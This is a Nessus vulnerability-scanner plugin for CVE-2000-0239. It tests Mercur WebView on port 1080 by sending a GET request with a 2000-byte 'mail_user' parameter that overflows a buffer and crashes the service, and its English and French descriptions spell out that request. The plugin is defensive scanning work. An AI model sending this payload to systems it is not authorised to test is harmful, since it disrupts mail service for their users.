#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10346);
 script_bugtraq_id(1056);
 script_version ("$Revision: 1.13 $");
 script_cve_id("CVE-2000-0239");
 name["english"] = "Mercur WebView WebClient";
 name["francais"] = "Mercur WebView WebClient";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
The remote WebView service does not do proper bound
checking when it handles the GET request,
and thus is subject to a buffer overflow
which results in a Denial of Service.

The request that could lead to a buffer
overflow is :

	GET /mmain.html&mail_user=aaa[...]aaa

An attacker may use this problem to
prevent your users from checking their
mails.


Solution : contact the vendor for a patch
Risk factor : High";


 desc["francais"] = "
Le service WebView distant ne vérifie pas
correctement la longueur des arguments qu'il
recoit lorsqu'il traite la commande GET
et est par conséquent sujet à un dépassement
de buffer qui permet de mener à un Déni
de Service.

La requete qui a permi de mener à un
déni de service est :

	GET /mmain.html&mail_user=aaa[...]aaa
	
Un pirate peut utiliser ce problème pour 
empecher les utilisateurs de relever leur mail.

Solution : contactez votre vendeur pour un patch
Facteur de risque : Sérieux";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Checks for a buffer overflow";
 summary["francais"] = "Vérifie la présence d'un dépassement de buffer";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "httpver.nasl");
 script_require_ports(1080);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");

port = 1080;

if(get_port_state(port))
{
 soc = http_open_socket(port);
 if(soc)
 {
  # check it's a web-server first
  req = http_get(item:"/", port:port);
  send(socket:soc, data:req);
  r = http_recv(socket:soc);
  http_close_socket(soc);
  if(!r)exit(0);
  if(!("HTTP" >< r))exit(0);
  
  soc2 = http_open_socket(port);
  if(soc2)
  {
   req2 = string("/mmain.html&mail_user=", crap(2000));
   req2 = http_get(item:req2, port:port);
   send(socket:soc2, data:req2);
   r2 = http_recv(socket:soc2);
   http_close_socket(soc2);
   if(!r2)security_hole(port);
  }
 }
}
